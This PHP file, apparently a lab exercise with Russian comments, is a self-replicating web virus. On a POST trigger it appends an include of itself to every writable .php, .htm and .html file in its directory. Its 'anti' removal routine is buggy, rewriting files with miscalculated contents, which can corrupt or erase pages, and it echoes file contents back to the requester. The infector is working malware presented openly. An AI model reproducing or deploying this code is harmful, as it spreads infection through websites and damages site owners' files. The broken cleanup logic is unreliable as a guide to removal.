<script>
    alert("Я вирус !!!");
</script>
<?php

if ($_POST['virus'] == 1) {
    $handle = opendir('.');
// открываем текущую диру

    while ($file = readdir($handle)) {
// читаем все файлы и их хэндлы
        $inf_ = true;
        $ext_ = false;
// ставим метки

        if (($ext_ = strstr($file, '.php')) || ($ext_ = strstr($file, '.htm')) || ($ext_ = strstr($file, '.html')))
            if (is_file($file) && is_writeable($file)) {
// проверяем расширение файла и его параметры
                $host = fopen($file, "r");
// открываем его на чтение
                $contents = fread($host, filesize($file));
// читаем файл
                $sig = strstr($contents, 'info.php');
// так это нашо тело, тело не заражать
                if (!$sig)
                    $inf_ = false;
// ставим метку
            }
        if (($inf_ == false)) {
// если не заражено
            $host = fopen($file, "a");
// открываем файл на запись
            fputs($host, "<?php ");
            fputs($host, "include(\"");
            fputs($host, __FILE__);
            fputs($host, "\"); ");
            fputs($host, "?>");
            fclose($host);
            //return;
        }
    }
// закрываем директорию
    closedir($handle);
}

if ($_POST['anti'] == 1 || $_GET['v'] == 2) {
    $handle = opendir('.');
// открываем текущую диру

    while ($file = readdir($handle)) {
// читаем все файлы и их хэндлы
        $inf_ = true;
        $ext_ = false;
// ставим метки

        if (($ext_ = strstr($file, '.php')) || ($ext_ = strstr($file, '.htm')) || ($ext_ = strstr($file, '.html')))
            if (is_file($file) && is_writeable($file)) {
// проверяем расширение файла и его параметры
                $host = fopen($file, "r");
// открываем его на чтение
                $contents = fread($host, filesize($file));
// читаем файл
                $sig = strstr($contents, 'info.php');
// так это нашо тело, тело не заражать
                echo $file."<br/>";
                if (!$sig)
                    $inf_ = false;
                
                if($inf_){
                    $new_contetnt = substr($contents, 0,filesize($file) - strpos($contents, '<?php include("Z:\home\lab20.bs\www\info.php")'));
                }else{
                    $new_contetnt = $contents;
                }
                
                echo $new_contetnt."<br/>";
// так это нашо тело, тело не заражать
// ставим метку
            }
             $host = fopen($file, "w+");
             fputs($host, $new_contetnt);
             fclose($host);
        /*if (($inf_ == false)) {
// если не заражено
            $host = fopen($file, "a");
// открываем файл на запись
            fputs($host, "<?php ");
            fputs($host, "include(\"");
            fputs($host, __FILE__);
            fputs($host, "\"); ");
            fputs($host, "?>");
            fclose($host);
            //return;
        }*/
    }
// закрываем директорию
    closedir($handle);
}
?>